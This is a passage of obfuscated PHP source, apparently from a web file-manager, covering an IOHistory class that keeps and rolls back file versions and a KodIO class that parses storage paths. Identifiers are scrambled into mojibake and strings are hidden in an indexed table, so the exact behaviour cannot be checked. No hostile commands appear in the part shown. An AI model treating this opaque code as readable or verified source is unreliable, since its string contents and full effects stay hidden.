$ÔÈú‘§Ñ), $ĞÉÎşú[1258]); show_json($ĞÉÎşú[1259] . json_encode($áµØ¬¸ö[$ĞÉÎşú[1246]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $è¸»ìüâ =& $_SERVER[—ÌÒğš÷]; $–ÈÒ§ô¿ = $GLOBALS[$è¸»ìüâ[6]][$è¸»ìüâ[89]]; if ($–ÈÒ§ô¿[$è¸»ìüâ[1260]] != 1) { return; } if ($–ÈÒ§ô¿[$è¸»ìüâ[1261]] <= 0) { return; } if (isset($_REQUEST[$è¸»ìüâ[1262]]) && $_REQUEST[$è¸»ìüâ[1262]] == $è¸»ìüâ[88]) { return; } Hook::bind($è¸»ìüâ[1263], $è¸»ìüâ[1264]); Hook::bind($è¸»ìüâ[1265], $è¸»ìüâ[1266]); Hook::bind($è¸»ìüâ[1267], $è¸»ìüâ[1268]); Hook::bind($è¸»ìüâ[1269], $è¸»ìüâ[1270]); Hook::bind($è¸»ìüâ[1271], $è¸»ìüâ[1272]); Hook::bind($è¸»ìüâ[1273], $è¸»ìüâ[1274]); } public static function eventBeforeUpload($…¿Å•°¸) { if ($…¿Å•°¸[3] && $…¿Å•°¸[3] != REPEAT_REPLACE) { return; } $ó†ŒÊª‰ = self::parsePath($…¿Å•°¸[0]); if (!$ó†ŒÊª‰) { return; } self::add($ó†ŒÊª‰); } public static function eventBeforeEdit($±¹‹åïğ) { $Å²«…À = self::parsePath($±¹‹åïğ[0]); if (!$Å²«…À) { return; } self::add($Å²«…À); } public static function eventBeforeCopyFile($‹ôèµŒ‚, $•Ÿ’û¸Õ, $½¯ÍÆû, $÷œ´ì, $Åá…ºêê, $Ù¤€¥œ‹) { $ùÇ†ºí =& $_SERVER[—ÌÒğš÷]; if (isset($½¯ÍÆû->_data[$ùÇ†ºí[1199]]) && $½¯ÍÆû->_data[$ùÇ†ºí[1199]]) { return; } $èê¨è”à = $½¯ÍÆû->getPathOuter($÷œ´ì); $²²§¼ïÕ = self::parsePath($èê¨è”à); if (!$²²§¼ïÕ) { return; } self::add($²²§¼ïÕ); } public static function eventBeforeRename($šÃËÏ›™) { $–é—ª… =& $_SERVER[—ÌÒğš÷]; $¹œÆ’Œ× = self::parsePath($šÃËÏ›™[0]); if (!$¹œÆ’Œ×) { return; } $˜Ô‰•Ø = self::checkInHistory($¹œÆ’Œ×); if (!$˜Ô‰•Ø) { return; } if ($˜Ô‰•Ø[$–é—ª…[33]] == $–é—ª…[214]) { $öüÅÃ‡« = self::listData($¹œÆ’Œ×); if ($öüÅÃ‡« && $öüÅÃ‡«[$–é—ª…[413]]) { self::moveHistory($¹œÆ’Œ×, $šÃËÏ›™[1]); } } else { IO::rename($˜Ô‰•Ø[$–é—ª…[84]], $šÃËÏ›™[1]); } } public static function eventBeforeMove($é¼ı†ê‰) { $Ú‰Ø«ô™ =& $_SERVER[—ÌÒğš÷]; $¾¼ßğù = self::parsePath($é¼ı†ê‰[0]); if (!$¾¼ßğù) { return; } $ „¢ÈØ = self::parsePath($é¼ı†ê‰[1]); if (!$ „¢ÈØ) { return; } $åÂß‹…Ì = $é¼ı†ê‰[3]; $ß­‹àÅ½ = self::checkInHistory($¾¼ßğù); if (!$ß­‹àÅ½) { return; } $Ø¸Ê™™¡ = self::pathHistory($ „¢ÈØ); if ($ß­‹àÅ½[$Ú‰Ø«ô™[33]] == $Ú‰Ø«ô™[214]) { $¡ã‰¸Ó = self::listData($¾¼ßğù); $„²Ø‡£ = rtrim($ „¢ÈØ, $Ú‰Ø«ô™[8]) . $Ú‰Ø«ô™[8] . ($åÂß‹…Ì ? $åÂß‹…Ì : get_path_this($¾¼ßğù)); $¢ŞæÏğ = self::listData($„²Ø‡£); if ($¡ã‰¸Ó && $¡ã‰¸Ó[$Ú‰Ø«ô™[413]] && $¢ŞæÏğ && $¢ŞæÏğ[$Ú‰Ø«ô™[413]]) { return self::clear($¾¼ßğù); } if ($¡ã‰¸Ó && $¡ã‰¸Ó[$Ú‰Ø«ô™[413]]) { self::moveHistory($¾¼ßğù, $åÂß‹…Ì, $Ø¸Ê™™¡); } } else { IO::move($ß­‹àÅ½[$Ú‰Ø«ô™[84]], $Ø¸Ê™™¡, !1, $åÂß‹…Ì); self::clearEmptyFolder(IO::pathFather($ß­‹àÅ½[$Ú‰Ø«ô™[84]])); } } public static function eventAfterRemove($³Çš²Á„, $Æ®Ï¢›Î) { $è¼ì²À² =& $_SERVER[—ÌÒğš÷]; if (!$Æ®Ï¢›Î) { return; } $ÆŠ¡®èø = self::parsePath($³Çš²Á„[0]); if (!$ÆŠ¡®èø) { return; } $›Òã·ì˜ = self::checkInHistory($ÆŠ¡®èø); if (!$›Òã·ì˜) { return; } if ($›Òã·ì˜[$è¼ì²À²[33]] == $è¼ì²À²[214]) { $‘ãÔõ…ò = self::listData($ÆŠ¡®èø, !1); if ($‘ãÔõ…ò && $‘ãÔõ…ò[$è¼ì²À²[413]]) { self::clear($ÆŠ¡®èø, !1); } } else { IO::remove($›Òã·ì˜[$è¼ì²À²[84]]); self::clearEmptyFolder(IO::pathFather($›Òã·ì˜[$è¼ì²À²[84]])); } } private static function checkInHistory($æÆ½Øæ±) { $”áÉ­› = self::pathHistory($æÆ½Øæ±); if (!IO::exist($”áÉ­›)) { $”áÉ­› .= $_SERVER[—ÌÒğš÷][1275]; } return IO::exist($”áÉ­›) ? IO::info($”áÉ­›) : !1; } private static function parsePath($¨Ñ“Ûƒ”) { $©ôÁÁ¿ =& $_SERVER[—ÌÒğš÷]; if (!$¨Ñ“Ûƒ”) { return !1; } if ($GLOBALS[$©ôÁÁ¿[1276]]) { return; } $ü§¨•¯÷ = KodIO::parse($¨Ñ“Ûƒ”); $÷°…ù‹Å = $ü§¨•¯÷[$©ôÁÁ¿[33]]; $¶µÌÕÉ = !$÷°…ù‹Å || $÷°…ù‹Å == KodIO::KOD_IO || $÷°…ù‹Å == KodIO::KOD_SHARE_ITEM; if (!$¶µÌÕÉ || !$ü§¨•¯÷[$©ôÁÁ¿[1277]]) { return !1; } if (substr($¨Ñ“Ûƒ”, 0, strlen(DATA_PATH . $©ôÁÁ¿[1278])) == DATA_PATH . $©ôÁÁ¿[1278]) { return !1; } if ($÷°…ù‹Å == KodIO::KOD_SHARE_ITEM) { $Ì‹ˆÁ«ß = IO::init($¨Ñ“Ûƒ”); if ($Ì‹ˆÁ«ß->pathParse[$©ôÁÁ¿[1195]]) { return self::parsePath($Ì‹ˆÁ«ß->pathParse[$©ôÁÁ¿[1195]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $×İšÔÉ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $©ôÁÁ¿[1279]); foreach ($×İšÔÉ as $àëŞ²¶) { if (!$÷°…ù‹Å && substr($¨Ñ“Ûƒ”, 0, strlen($àëŞ²¶)) == $àëŞ²¶) { return !1; } } self::log($GLOBALS[$©ôÁÁ¿[1190]] . $©ôÁÁ¿[1280] . $¨Ñ“Ûƒ”); return $¨Ñ“Ûƒ”; } private static function pathHistory($ÊŞÚ™§Æ) { $âÆ€Ë´ø =& $_SERVER[—ÌÒğš÷]; $Ê’Â¥ïà = self::$_historyBase . ltrim(KodIO::clear($ÊŞÚ™§Æ), $âÆ€Ë´ø[8]); $Ê’Â¥ïà = str_replace(array($âÆ€Ë´ø[1281]), array($âÆ€Ë´ø[1282]), $Ê’Â¥ïà); return $Ê’Â¥ïà; } public static function log($ÎğÏ¢îğ) { } public static function historyCount($Â—´İ” ) { $¶¿«øÏ =& $_SERVER[—ÌÒğš÷]; $Äî“ı®« = array(); $¨ÄâåÊ… = array(); foreach ($Â—´İ”  as $ªõã§Ã) { $ƒ„Ü»æ = get_path_father($ªõã§Ã); if (!$¨ÄâåÊ…[$ƒ„Ü»æ]) { $¨ÄâåÊ…[$ƒ„Ü»æ] = array(); } $¨ÄâåÊ…[$ƒ„Ü»æ][] = get_path_this($ªõã§Ã); } foreach ($¨ÄâåÊ… as $ƒ„Ü»æ => $œ® •»í) { $ïø²Üº = self::parsePath($ƒ„Ü»æ); if (!$ïø²Üº) { continue; } foreach ($œ® •»í as $ãø’å–) { $ş·‚ß = self::listData(rtrim($ïø²Üº, $¶¿«øÏ[8]) . $¶¿«øÏ[8] . $ãø’å–, !1); if ($ş·‚ß && $ş·‚ß[$¶¿«øÏ[413]]) { $Äî“ı®«[rtrim($ƒ„Ü»æ, $¶¿«øÏ[8]) . $¶¿«øÏ[8] . $ãø’å–] = count($ş·‚ß[$¶¿«øÏ[413]]); } } } return $Äî“ı®«; } public static function add($ÀİóŞ³) { $Ñì²º„Ö =& $_SERVER[—ÌÒğš÷]; $ı¥–İÔ• = self::listData($ÀİóŞ³); if (!$ı¥–İÔ•) { return; } $£ÇìÊ©Ï = Model($Ñì²º„Ö[806])->get($Ñì²º„Ö[1283]); $³¨‰×Î = $GLOBALS[$Ñì²º„Ö[6]][$Ñì²º„Ö[89]][$Ñì²º„Ö[1261]]; $ß“ı…öÁ = $£ÇìÊ©Ï == $Ñì²º„Ö[1284] ? min(5, $³¨‰×Î) : $³¨‰×Î; if ($³¨‰×Î <= 0) { return; } $‚–½»¤ = IO::info($ÀİóŞ³); $ñÅ€²® = $ı¥–İÔ•[$Ñì²º„Ö[413]]; if ($‚–½»¤[$Ñì²º„Ö[76]] == 0) { return; } if ($‚–½»¤[$Ñì²º„Ö[76]] >= 1024 * 1024 * 500) { return !1; } $±ì—ËĞ = IO::hashSimple($ÀİóŞ³); if ($ñÅ€²® && $ñÅ€²®[0][$Ñì²º„Ö[640]] == $±ì—ËĞ) { return !0; } if (array_key_exists($Ñì²º„Ö[217], $‚–½»¤) && !$‚–½»¤[$Ñì²º„Ö[217]]) { return !1; } $ÔŸĞ´¡ç = short_id(time()); $×§°ÛÓü = array($Ñì²º„Ö[443] => $ÔŸĞ´¡ç, $Ñì²º„Ö[640] => $±ì—ËĞ, $Ñì²º„Ö[32] => $‚–½»¤[$Ñì²º„Ö[32]] . $Ñì²º„Ö[10] . date($Ñì²º„Ö[1285]) . rand_string(1), $Ñì²º„Ö[76] => $‚–½»¤[$Ñì²º„Ö[76]], $Ñì²º„Ö[495] => USER_ID, $Ñì²º„Ö[215] => time(), $Ñì²º„Ö[1286] => $Ñì²º„Ö[12]); IO::mkdir($ı¥–İÔ•[$Ñì²º„Ö[1287]]); $ëŒ¡®‡ = IO::copy($ÀİóŞ³, $ı¥–İÔ•[$Ñì²º„Ö[1287]], !1, $×§°ÛÓü[$Ñì²º„Ö[32]]); if (!$ëŒ¡®‡) { self::clearEmptyFolder($ı¥–İÔ•[$Ñì²º„Ö[1287]]); return !1; } array_unshift($ñÅ€²®, $×§°ÛÓü); if (count($ñÅ€²®) > $ß“ı…öÁ) { $‹´ë´à¥ = array_slice($ñÅ€²®, $ß“ı…öÁ); foreach ($‹´ë´à¥ as $°ƒ×Ïâ¥) { IO::remove($ı¥–İÔ•[$Ñì²º„Ö[1287]] . $°ƒ×Ïâ¥[$Ñì²º„Ö[32]]); } $ñÅ€²® = array_slice($ñÅ€²®, 0, $ß“ı…öÁ); } return self::saveData($ı¥–İÔ•[$Ñì²º„Ö[1288]], $ñÅ€²®); } public static function remove($°ç’­³à, $Ê·í¯ò) { $ëÍè¼ŒÏ =& $_SERVER[—ÌÒğš÷]; $Õ´çŠøå = self::listData($°ç’­³à); $Âîàøíê = array(); if (!$Õ´çŠøå) { return !1; } foreach ($Õ´çŠøå[$ëÍè¼ŒÏ[413]] as $ú‰ôç¾¦) { if ($ú‰ôç¾¦[$ëÍè¼ŒÏ[443]] == $Ê·í¯ò) { IO::remove($Õ´çŠøå[$ëÍè¼ŒÏ[1287]] . $ú‰ôç¾¦[$ëÍè¼ŒÏ[32]]); continue; } $Âîàøíê[] = $ú‰ôç¾¦; } return self::saveData($Õ´çŠøå[$ëÍè¼ŒÏ[1288]], $Âîàøíê); } public static function clear($Ñ‘Ôş™è, $ÈıÑ¯Û = true) { $ì¾†¹¬Á =& $_SERVER[—ÌÒğš÷]; $Äß—œÏ = self::listData($Ñ‘Ôş™è, $ÈıÑ¯Û); if (!$Äß—œÏ) { return !1; } foreach ($Äß—œÏ[$ì¾†¹¬Á[413]] as $Îä»éÌû) { IO::remove($Äß—œÏ[$ì¾†¹¬Á[1287]] . $Îä»éÌû[$ì¾†¹¬Á[32]]); } return self::saveData($Äß—œÏ[$ì¾†¹¬Á[1288]], array()); } public static function moveHistory($İ÷õËá, $–Â‡¸ßä = '', $‰şş¶‹ = '') { $Š–äµ¡ =& $_SERVER[—ÌÒğš÷]; $‰Ì®ÚÚÍ = self::listData($İ÷õËá, !1); if (!$‰Ì®ÚÚÍ || !$‰Ì®ÚÚÍ[$Š–äµ¡[413]]) { return !1; } $êñ„€•¢ = $Š–äµ¡[1275]; $–Â‡¸ßä = $–Â‡¸ßä ? $–Â‡¸ßä : get_path_this($İ÷õËá); $‰şş¶‹ = $‰şş¶‹ ? $‰şş¶‹ : $‰Ì®ÚÚÍ[$Š–äµ¡[1287]]; $¬Ô®¤Úö = substr(get_path_this($‰Ì®ÚÚÍ[$Š–äµ¡[1288]]), 0, -strlen($êñ„€•¢)); foreach ($‰Ì®ÚÚÍ[$Š–äµ¡[413]] as $µøû¼ìÛ => $˜î³¨‘Ò) { $„ÃŸ‰‰ = $–Â‡¸ßä . substr($˜î³¨‘Ò[$Š–äµ¡[32]], strlen($¬Ô®¤Úö)); $ÀŸœ¬§¾ = IO::move($‰Ì®ÚÚÍ[$Š–äµ¡[1287]] . $˜î³¨‘Ò[$Š–äµ¡[32]], $‰şş¶‹, !1, $„ÃŸ‰‰); if ($ÀŸœ¬§¾) { $‰Ì®ÚÚÍ[$Š–äµ¡[413]][$µøû¼ìÛ][$Š–äµ¡[32]] = $„ÃŸ‰‰; } } $‰Ì®ÚÚÍ[$Š–äµ¡[1288]] = IO::move($‰Ì®ÚÚÍ[$Š–äµ¡[1288]], $‰şş¶‹, !1, $–Â‡¸ßä . $êñ„€•¢); self::saveData($‰Ì®ÚÚÍ[$Š–äµ¡[1288]], $‰Ì®ÚÚÍ[$Š–äµ¡[413]]); self::clearEmptyFolder($‰Ì®ÚÚÍ[$Š–äµ¡[1287]]); } public static function rollback($éÚŞ„ˆì, $ŸÁ¯âÄØ) { $“ÒÛÔä› =& $_SERVER[—ÌÒğš÷]; $£à˜ıÊ¿ = self::listData($éÚŞ„ˆì); if (!$£à˜ıÊ¿) { return; } $¨Ï˜Ø¤à = IO::info($éÚŞ„ˆì); foreach ($£à˜ıÊ¿[$“ÒÛÔä›[413]] as $·ïşÎšò => $ñıÍÅ³Ô) { if ($ñıÍÅ³Ô[$“ÒÛÔä›[443]] == $ŸÁ¯âÄØ) { self::add($éÚŞ„ˆì); $ ãÎé–Ë = $£à˜ıÊ¿[$“ÒÛÔä›[1287]] . $ñıÍÅ³Ô[$“ÒÛÔä›[32]]; $ûÉœ±ªÛ = IO::copy($ ãÎé–Ë, IO::pathFather($éÚŞ„ˆì), REPEAT_REPLACE, $¨Ï˜Ø¤à[$“ÒÛÔä›[32]]); if ($ûÉœ±ªÛ) { self::remove($éÚŞ„ˆì, $ŸÁ¯âÄØ); } return $ûÉœ±ªÛ; } } return !1; } public static function setDetail($¼¦Æ‘ªÖ, $Æ³¯ÓçÆ, $è½ÃÕ²ß) { $Ë¡‘¼Ò =& $_SERVER[—ÌÒğš÷]; $õ°Äœ»İ = self::listData($¼¦Æ‘ªÖ); if (!$õ°Äœ»İ) { return; } foreach ($õ°Äœ»İ[$Ë¡‘¼Ò[413]] as $¹¶‹ò => $’å„µŒŞ) { if ($’å„µŒŞ[$Ë¡‘¼Ò[443]] == $Æ³¯ÓçÆ) { $õ°Äœ»İ[$Ë¡‘¼Ò[413]][$¹¶‹ò][$Ë¡‘¼Ò[1286]] = $è½ÃÕ²ß; self::saveData($õ°Äœ»İ[$Ë¡‘¼Ò[1288]], $õ°Äœ»İ[$Ë¡‘¼Ò[413]]); return !0; } } return !1; } public static function fileInfo($ñıÁìû£, $§ÖÌ¯½) { $µÒóšÁò =& $_SERVER[—ÌÒğš÷]; $¾©Ôúàø = self::listData($ñıÁìû£); if (!$¾©Ôúàø) { show_json(LNG($µÒóšÁò[105]), !1); } $³±¥§òú = $µÒóšÁò[12]; foreach ($¾©Ôúàø[$µÒóšÁò[413]] as $Ûã£‹ => $İÒÇí¾é) { if ($İÒÇí¾é[$µÒóšÁò[443]] != $§ÖÌ¯½) { continue; } $³±¥§òú = $¾©Ôúàø[$µÒóšÁò[1287]] . $İÒÇí¾é[$µÒóšÁò[32]]; break; } if (!$³±¥§òú) { show_json(LNG($µÒóšÁò[105]), !1); } return IO::info($³±¥§òú); } public static function fileOut($©Şš°‚, $‰·Í‹·è, $ªÔî¸É¤ = false) { $ÄàãÖ´£ =& $_SERVER[—ÌÒğš÷]; $…ã¶Æ¨ = self::fileInfo($©Şš°‚, $‰·Í‹·è); $úò»ü—¼ =& $GLOBALS[$ÄàãÖ´£[7]]; $ªÔî¸É¤ = isset($úò»ü—¼[$ÄàãÖ´£[1238]]) && $úò»ü—¼[$ÄàãÖ´£[1238]] == 1; if (isset($úò»ü—¼[$ÄàãÖ´£[33]]) && $úò»ü—¼[$ÄàãÖ´£[33]] == $ÄàãÖ´£[1289]) { return IO::fileOutImage($…ã¶Æ¨[$ÄàãÖ´£[84]], $úò»ü—¼[$ÄàãÖ´£[1290]]); } IO::fileOut($…ã¶Æ¨[$ÄàãÖ´£[84]], $ªÔî¸É¤, get_path_this($©Şš°‚)); } public static function listData($¥Ù»‡Ù¿, $çğÚƒ­ò = true) { $•ñÁîØÒ =& $_SERVER[—ÌÒğš÷]; if ($çğÚƒ­ò && !IO::exist($¥Ù»‡Ù¿)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¥Ù»‡Ù¿, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $°»í¯Æ² = self::pathHistory($¥Ù»‡Ù¿); $Û¸‹‡ƒû = array($•ñÁîØÒ[1288] => $°»í¯Æ² . $•ñÁîØÒ[1275], $•ñÁîØÒ[1287] => rtrim(get_path_father($°»í¯Æ²), $•ñÁîØÒ[8]) . $•ñÁîØÒ[8], $•ñÁîØÒ[413] => array()); $‹åÏ³áå = IO::getContent($Û¸‹‡ƒû[$•ñÁîØÒ[1288]]); if ($‹åÏ³áå) { $²ªï‹’” = json_decode($‹åÏ³áå, !0); if (is_array($²ªï‹’”)) { $Û¸‹‡ƒû[$•ñÁîØÒ[413]] = $²ªï‹’”; } } return $Û¸‹‡ƒû; } private static function saveData($¢ÊÔÀÓµ, $Éì¢èœß) { $šÜ¨ÁûÆ =& $_SERVER[—ÌÒğš÷]; self::log($šÜ¨ÁûÆ[1291] . $¢ÊÔÀÓµ . $šÜ¨ÁûÆ[71] . count($Éì¢èœß), $šÜ¨ÁûÆ[787]); if ($Éì¢èœß) { return IO::setContent($¢ÊÔÀÓµ, json_encode($Éì¢èœß)); } $üÓŞë÷“ = IO::pathFather($¢ÊÔÀÓµ); IO::remove($¢ÊÔÀÓµ); self::clearEmptyFolder($üÓŞë÷“); return !0; } public static function clearEmptyFolder($ “¦ÙñÂ) { $ªÉ¦ =& $_SERVER[—ÌÒğš÷]; if (trim($ “¦ÙñÂ, $ªÉ¦[8]) == trim(self::$_historyBase, $ªÉ¦[8])) { return; } $ö¥‰¤ê€ = IO::pathFather($ “¦ÙñÂ); $¤”¿Ù¡¸ = IO::has($ “¦ÙñÂ, !0); if ($¤”¿Ù¡¸[$ªÉ¦[223]] > 0 || $¤”¿Ù¡¸[$ªÉ¦[224]] > 0) { return; } IO::remove($ “¦ÙñÂ); self::clearEmptyFolder($ö¥‰¤ê€); } private static function getBasePath() { $¾é¼ô« =& $_SERVER[—ÌÒğš÷]; $ÏÙ»ËÕÎ = Model($¾é¼ô«[1292])->get($¾é¼ô«[1293]); if ($ÏÙ»ËÕÎ) { if (!IO::exist($ÏÙ»ËÕÎ)) { IO::mkdir($ÏÙ»ËÕÎ); } if (get_path_this($ÏÙ»ËÕÎ) == $¾é¼ô«[1278]) { $ÆÂõ‰ßî = $¾é¼ô«[1294] . rand_string(8); @rename($ÏÙ»ËÕÎ, get_path_father($ÏÙ»ËÕÎ) . $¾é¼ô«[8] . $ÆÂõ‰ßî); $ÏÙ»ËÕÎ = DATA_PATH . $ÆÂõ‰ßî . $¾é¼ô«[8]; file_put_contents(DATA_PATH . $¾é¼ô«[1228], $¾é¼ô«[12]); Model($¾é¼ô«[1292])->set($¾é¼ô«[1293], $ÏÙ»ËÕÎ); } return $ÏÙ»ËÕÎ; } $ÏÙ»ËÕÎ = DATA_PATH . $¾é¼ô«[1294] . rand_string(8) . $¾é¼ô«[8]; $ÏÙ»ËÕÎ = IO::mkdir($ÏÙ»ËÕÎ); $ÏÙ»ËÕÎ = rtrim($ÏÙ»ËÕÎ, $¾é¼ô«[8]) . $¾é¼ô«[8]; file_put_contents($ÏÙ»ËÕÎ . $¾é¼ô«[1228], $¾é¼ô«[12]); file_put_contents(DATA_PATH . $¾é¼ô«[1228], $¾é¼ô«[12]); Model($¾é¼ô«[1292])->set($¾é¼ô«[1293], $ÏÙ»ËÕÎ); return $ÏÙ»ËÕÎ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\x65\x63\171\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\145\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\145\162\106\151\154\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\106\151\x6c\x65\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\160\x52\x6f\x6f\164\123\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\x75\163\x65\x72\x53\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\123\150\141\162\145\x4c\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\162\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\141\162\x65\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\162\145\111\164\145\155\114\x69\156\153\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\150\x7d"; const KOD_BLOCK = "\173\142\154\157\x63\x6b\x7d"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\x65\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\x65\x72\175"; public static function typeList() { $®ø…£ñù =& $_SERVER[—ÌÒğš÷]; return array($®ø…£ñù[1295] => self::KOD_SOURCE, $®ø…£ñù[1296] => self::KOD_USER_RECYCLE, $®ø…£ñù[1297] => self::KOD_USER_FAV, $®ø…£ñù[1298] => self::KOD_USER_FILE_TAG, $®ø…£ñù[1299] => self::KOD_USER_FILE_TYPE, $®ø…£ñù[1300] => self::KOD_GROUP_ROOT_SELF, $®ø…£ñù[1301] => self::KOD_USER_SHARE, $®ø…£ñù[1302] => self::KOD_USER_SHARE_LINK, $®ø…£ñù[1303] => self::KOD_USER_SHARE_TO_ME, $®ø…£ñù[1304] => self::KOD_SHARE_ITEM, $®ø…£ñù[1305] => self::KOD_SHARE_LINK, $®ø…£ñù[1306] => self::KOD_SEARCH, $®ø…£ñù[1307] => self::KOD_BLOCK, $®ø…£ñù[1308] => self::KOD_IO, $®ø…£ñù[1309] => self::KOD_USER_RECENT, $®ø…£ñù[1310] => self::KOD_USER_DRIVER); } public static function parse($Ğƒ‰ñÈâ) { $‡ÃòèĞ =& $_SERVER[—ÌÒğš÷]; $Ğƒ‰ñÈâ = self::clear($Ğƒ‰ñÈâ); $ƒ–Ú†æõ = array_values(self::typeList()); preg_match($‡ÃòèĞ[1311], $Ğƒ‰ñÈâ, $ßú½¢Ù‘); $ïµ»şÁù = array($‡ÃòèĞ[464] => !1, $‡ÃòèĞ[1312] => !1, $‡ÃòèĞ[461] => !1, $‡ÃòèĞ[84] => $Ğƒ‰ñÈâ, $‡ÃòèĞ[1213] => !1, $‡ÃòèĞ[1212] => $‡ÃòèĞ[12]); if (is_array($ßú½¢Ù‘) && count($ßú½¢Ù‘) == 5) { $ƒìê¡Â® = $‡ÃòèĞ[1313] . $ßú½¢Ù‘[2] . $‡ÃòèĞ[371]; if (in_array($ƒìê¡Â®, $ƒ–Ú†æõ)) { $ïµ»şÁù[$‡ÃòèĞ[1213]] = $ßú½¢Ù‘[1]; $ïµ»şÁù[$‡ÃòèĞ[33]] = $ƒìê¡Â®; $ïµ»şÁù[$‡ÃòèĞ[1314]] = substr($ƒìê¡Â®, 1, -1); $ïµ»şÁù[$‡ÃòèĞ[443]] = $ßú½¢Ù‘[3]; } $ïµ»şÁù[$‡ÃòèĞ[1212]] = $ßú½¢Ù‘[4]; } $Îƒ˜Õ” = array($‡ÃòèĞ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ïµ»şÁù[$‡ÃòèĞ[1277]] = in_array($ïµ»şÁù[$‡ÃòèĞ[33]], $Îƒ˜Õ”); return $ïµ»şÁù; } public static function isTruePath($¨¬ÂÍ´é) { $¾Îı¼”” =& $_SERVER[—ÌÒğš÷]; if (substr($¨¬ÂÍ´é, 0, 1) != $¾Îı¼””[1313]) { return !0; } if (strpos($¨¬ÂÍ´é, $¾Îı¼””[451]) === 0) { return !0; } if (strpos($¨¬ÂÍ´é, $¾Îı¼””[1281]) === 0) { return !0; } if (strpos($¨¬ÂÍ´é, $¾Îı¼””[1315]) === 0) { return !0; } if (strpos($¨¬ÂÍ´é, $¾Îı¼””[1316]) === 0) { return !0; } if (strpos($¨¬ÂÍ´é, $¾Îı¼””[1317]) === 0) { return !0; } return !1; } public static function clear($‹‚§ıÅø) { $€×ˆâÚì =& $_SERVER[—ÌÒğš÷]; $‹‚§ıÅø = str_replace(array($€×ˆâÚì[1122], $€×ˆâÚì[246]), $€×ˆâÚì[53], $‹‚§ıÅø); $‹‚§ıÅø = str_replace($€×ˆâÚì[97], $€×ˆâÚì[8], $‹‚§ıÅø); $…íÉ©Ÿ² = $€×ˆâÚì[1318]; if (substr($‹‚§ıÅø, 0, 3) == $€×ˆâÚì[1319]) { $‹‚§ıÅø = substr($‹‚§ıÅø, 3); } while (strstr($‹‚§ıÅø, $…íÉ©Ÿ²)) { $‹‚§ıÅø = str_replace($…íÉ©Ÿ², $€×ˆâÚì[8], $‹‚§ıÅø); } $‹‚§ıÅø = preg_replace($€×ˆâÚì[1320], $€×ˆâÚì[8], $‹‚§ıÅø); if ($‹‚§ıÅø == $€×ˆâÚì[8]) { return $€×ˆâÚì[8]; } $‹‚§ıÅø = rtrim($‹‚§ıÅø, $€×ˆâÚì[8]); return $‹‚§ıÅø; } public static function pathTrue($¨÷æ°¬È) { $û­ØŒû =& $_SERVER[—ÌÒğš÷]; if (!$¨÷æ°¬È) { return $û­ØŒû[12]; } $¨÷æ°¬È = str_replace($û­ØŒû[561], $û­ØŒû[8], str_replace($û­ØŒû[1321], $û­ØŒû[8], $¨÷æ°¬È)); $¨÷æ°¬È = str_replace($û­ØŒû[561], $û­ØŒû[8], str_replace($û­ØŒû[1321], $û­ØŒû[8], $¨÷æ°¬È)); if (!strstr($¨÷æ°¬È, $û­ØŒû[1319])) { return $¨÷æ°¬È; } $™Œı†› = explode($û­ØŒû[8], $¨÷æ°¬È); foreach ($™Œı†› as $ÕİæŸ¯ù => $¯äµ‰Å) { if ($¯äµ‰Å !== $û­ØŒû[1322]) { continue; } for ($ŒĞé¥‚ = $ÕİæŸ¯ù; $ŒĞé¥‚ >= 0; $ŒĞé¥‚--) { if ($™Œı†›[$ŒĞé¥‚] === $û­ØŒû[10] || $™Œı†›[$ŒĞé¥‚] === $û­ØŒû[1322] || $™Œı†›[$ŒĞé¥‚] === -1) { continue; } if ($™Œı†›[$ŒĞé¥‚] === $û­ØŒû[12]) { $™Œı†›[$ÕİæŸ¯ù] = -1; break; } $™Œı†›[$ÕİæŸ¯ù] = -1; $™Œı†›[$ŒĞé¥‚] = -1; break; } } $â•ûüñ = array(); foreach ($™Œı†› as $¯äµ‰Å) { if ($¯äµ‰Å !== -1) { $â•ûüñ[] = $¯äµ‰Å; } } $¡äİüŒÈ = implode($û­ØŒû[8], $â•ûüñ); if (strpos($¡äİüŒÈ, $û­ØŒû[1323]) === 0) { $¡äİüŒÈ = $û­ØŒû[1319] . substr($¡äİüŒÈ, strlen($û­ØŒû[1323])); } return $¡äİüŒÈ; } public static function sourceID($Ô‚áÅ§ñ) { $ çì©—” =& $_SERVER[—ÌÒğš÷]; $ñ·ù¼Ë = self::parse($Ô‚áÅ§ñ); if ($ñ·ù¼Ë[$ çì©—”[33]] !== self::KOD_SOURCE) { show_json(LNG($ çì©—”[1324]), !1); } return $ñ·ù¼Ë[$ çì©—”[443]]; } public static function make($ì õ·şì) { if (!$ì õ·şì) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ì õ·şì)); } public static function makeShare($Ê©ïÕĞ¸, $ñšÌà¹) { return self::makePath(self::KOD_SHARE_ITEM, $Ê©ïÕĞ¸, $ñšÌà¹); } public static function makeFileTypePath($“¢º£¸¢) { return self::makePath(self::KOD_USER_FILE_TYPE, $“¢º£¸¢); } public static function makeFileTagPath($áãáÀ) { return self::makePath(self::KOD_USER_FILE_TAG, $áãáÀ); } public static function makePath($‡³íÖ†Ì, 